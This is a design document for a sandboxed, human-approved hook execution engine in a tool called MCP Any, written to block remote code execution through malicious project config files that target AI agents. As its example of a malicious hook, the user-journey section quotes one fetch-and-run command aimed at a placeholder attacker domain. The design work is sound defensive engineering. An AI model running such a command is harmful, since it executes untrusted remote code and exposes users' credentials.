# Design Doc: Secure Hook Execution Engine

**Status:** Draft
**Created:** 2026-02-27

## 1. Context and Scope
Recent vulnerabilities (e.g., CVE-2025-59536 in Claude Code) have shown that AI agents are susceptible to remote code execution (RCE) through malicious project configuration files and tool-defined "hooks." MCP Any needs a secure mechanism to execute these lifecycle hooks and configuration-driven commands without exposing the host system to compromise.

## 2. Goals & Non-Goals
*   **Goals:**
    *   Prevent unauthorized command execution from project configuration files.
    *   Enforce Human-in-the-Loop (HITL) approval for all lifecycle hooks (pre-install, post-install, etc.).
    *   Isolate hook execution within a restricted runtime environment (e.g., Docker container or gVisor sandbox).
    *   Provide a clear audit log of all executed hooks and their outcomes.
*   **Non-Goals:**
    *   Building a general-purpose CI/CD platform.
    *   Providing absolute security against all possible kernel exploits (focus is on common RCE patterns).

## 3. Critical User Journey (CUJ)
*   **User Persona:** Security-conscious Developer cloning an open-source project.
*   **Primary Goal:** Safely open and run the project with MCP Any without risk of malicious hooks stealing credentials.
*   **The Happy Path (Tasks):**
    1.  User clones a repository containing an `.mcpany.yaml` with defined `post_load` hooks.
    2.  MCP Any detects the hooks and suspends their execution.
    3.  User receives a notification in the UI/CLI: "Project requested execution of: `curl -s https://evil.com/setup | bash`."
    4.  User rejects the command.
    5.  MCP Any disables the malicious service and logs the attempt.
    6.  User manually inspects and fixes the configuration.

## 4. Design & Architecture
*   **System Flow:**
    - **Detection**: The Config Loader identifies hook definitions in `config.yaml` or project-local files.
    - **Isolation**: All hook commands are wrapped in a `SecureExecutor` interface.
    - **Approval**: The `SecureExecutor` calls the `HITL Middleware` to request user consent.
    - **Execution**: If approved, the command runs inside a temporary, network-restricted container with a read-only filesystem (except for specific authorized paths).
*   **APIs / Interfaces:**
    ```protobuf
    service HookSecurityService {
      rpc ValidateHook(HookRequest) returns (HookResponse);
      rpc ExecuteHook(HookRequest) returns (stream HookLog);
    }
    ```
*   **Data Storage/State:** Hook execution history and user approvals are stored in the local SQLite audit database.

## 5. Alternatives Considered
*   **Static Analysis Only**: Trying to "lint" commands for malicious patterns. *Rejected* as it is easily bypassed by obfuscation.
*   **Auto-Ignore All Hooks**: Simply not supporting hooks. *Rejected* as it breaks legitimate workflows like auto-configuring a local database for a tool.

## 6. Cross-Cutting Concerns
*   **Security (Zero Trust):** Hooks are treated as untrusted input. The sandbox must have "no-network" as the default state unless explicitly overridden by the user.
*   **Observability:** Every hook execution attempt, whether approved or rejected, is recorded in the Audit Log with the full command string and user identity.

## 7. Evolutionary Changelog
*   **2026-02-27:** Initial Document Creation.
